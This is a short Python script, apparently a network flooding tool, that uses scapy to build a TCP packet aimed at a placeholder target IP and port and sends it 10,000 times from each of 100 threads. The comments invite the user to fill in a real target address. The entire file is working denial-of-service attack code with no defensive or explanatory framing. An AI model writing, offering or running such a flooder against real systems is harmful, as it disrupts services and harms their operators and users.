from scapy.all import IP, TCP, send
import threading

def send_packet(ip_address, port, count):
    packet = IP(dst=ip_address)/TCP(dport=port)
    for _ in range(count):
        send(packet)
        print(f"Sent packet to {ip_address}:{port}")

def main():
    ip_address = "192.168.1.1"  # Replace with the target IP address
    port = 443  # Replace with the target port
    count = 10000  # Number of packets to send
    threads = 100 # Number of threads to use

    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send_packet, args=(ip_address, port, count))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()

if __name__ == "__main__":
    main()
